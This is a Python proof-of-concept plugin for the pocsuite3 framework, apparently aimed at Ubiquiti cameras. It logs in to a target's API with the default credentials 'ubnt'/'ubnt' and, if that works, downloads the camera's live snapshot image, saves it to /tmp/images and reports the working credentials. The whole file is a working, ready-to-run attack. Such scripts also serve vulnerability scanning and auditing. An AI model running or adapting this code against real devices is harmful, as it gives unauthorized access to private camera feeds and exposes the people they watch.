import os.path

from pocsuite3.api import (
    minimum_version_required, POCBase, register_poc, requests, logger,
    OptString, OrderedDict,
    random_str,
)
from requests import session
from requests.auth import HTTPDigestAuth
import re
from urllib.parse import urljoin,urlparse
import os
class POC(POCBase):
    def _verify(self):
        origin = re.search(r'http(s)?://([\w-]+\.)+\w{1,3}(:\d{1,6})?',self.url).group(0)
        # os.environ.setdefault('http_proxy', 'http://127.0.0.1:8080')
        # os.environ.setdefault('https_proxy', 'http://127.0.0.1:8080')
        creds = {
            'username': 'ubnt',
            'password': 'ubnt'
        }
        Cookie = {
            'ubntActiveUser':'false'
        }
        header = {
            'Origin':origin,
            'Referer':self.url,
            'Accept':'application/json, text/plain, */*'

        }

        session = requests.session()
        url = urljoin(self.url,'/api/1.1/login')
        res = session.post(url, json=creds, verify=False,cookies=Cookie,headers=header)
        if res.status_code == 200:
            # 登陆成功后带cookie获取图片
            cookie = res.cookies
            #logger.info(cookie)
            snap_url = urljoin(self.url,'/snap.jpeg')
            get_snap = session.get(snap_url,cookies=cookie)
            if get_snap.status_code == 200 and get_snap.headers['Content-Type'] == 'image/jpeg':
                parsed = urlparse(snap_url)
                image_dir = f'/tmp/images'
                if not os.path.exists(image_dir):
                    os.makedirs(image_dir)
                filename = os.path.join(image_dir,f"{parsed.netloc.replace(':','_')}") + '.jpg'
                with open(filename,'wb') as f:
                    f.write(get_snap.content)
                    logger.info('sava snapshot to {}'.format(filename))
                result = {'VerifyInfo': {'url': self.url}}
                result['VerifyInfo']['creds'] = creds
                return self.parse_output(result)

register_poc(POC)
